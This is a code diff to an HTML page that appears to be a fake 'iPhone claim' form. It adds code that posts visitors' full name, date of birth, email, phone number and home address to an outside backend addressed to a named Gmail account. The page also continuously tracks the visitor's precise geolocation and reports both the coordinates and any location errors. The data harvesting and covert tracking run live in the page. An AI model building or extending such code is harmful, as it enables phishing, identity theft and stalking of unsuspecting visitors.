@@ -13,12 +13,12 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f8ff;
+            background-color: #f0f8ff; /* Light background color to make form visible */
             font-family: Arial, sans-serif;
         }
         .container {
             max-width: 600px;
-            background: #ffffff;
+            background: #ffffff; /* Solid background color for form */
             padding: 2rem;
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
@@ -122,10 +122,7 @@
     </div>
 
     <!-- JavaScript code -->
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
     <script>
-        emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS User ID
-
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
             let lastSentPosition = null;
@@ -147,19 +144,8 @@
 
             function sendLocationEmail(latitude, longitude) {
                 locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                    latitude: latitude,
-                    longitude: longitude,
-                    recipient_email: "khalilrodeni@gmail.com",
-                }).then(
-                    function(response) {
-                        console.log("Email sent successfully", response.status, response.text);
-                    },
-                    function(error) {
-                        console.log("Failed to send email", error);
-                    }
-                );
+                const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
+                sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
             }
 
             function trackMovement() {
@@ -201,6 +187,7 @@
                                     locationDisplay.textContent = "An unknown error occurred.";
                                     break;
                             }
+                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                         },
                         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                     );
@@ -222,23 +209,47 @@
                 const city = document.getElementById("city").value;
                 const postalCode = document.getElementById("postalCode").value;
 
-                emailjs.send("service_7xiz4x8", "template_ux0sel8", {
-                    full_name: fullName,
-                    dob: dob,
-                    email: email,
-                    phone_number: phoneNumber,
-                    address: address,
-                    city: city,
-                    postal_code: postalCode,
-                }).then(
-                    function(response) {
-                        alert("Thank you for your submission! We will contact you shortly.");
-                    },
-                    function(error) {
-                        alert("Error sending email: " + error.text);
-                    }
-                );
+                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
+
+                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
+
+                alert("Thank you for your submission! We will contact you shortly.");
             });
+
+            function sendEmail(subject, message, recipientEmail) {
+                const emailData = {
+                    subject: subject,
+                    message: message,
+                    recipient_email: recipientEmail,
+                    recipient_name: "Khalil Ahmed"
+                };
+
+                fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(emailData)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error(`Server responded with ${response.status}`);
+                    }
+                })
+                .then(data => {
+                    if (data.message) {
+                        console.log("Email sent successfully");
+                    } else if (data.error) {
+                        alert("Error: " + data.error);
+                    }
+                })
+                .catch(error => {
+                    console.log("Error sending email:", error);
+                    alert("Error sending email: " + error.message);
+                });
+            }
         });
     </script>
 </body>
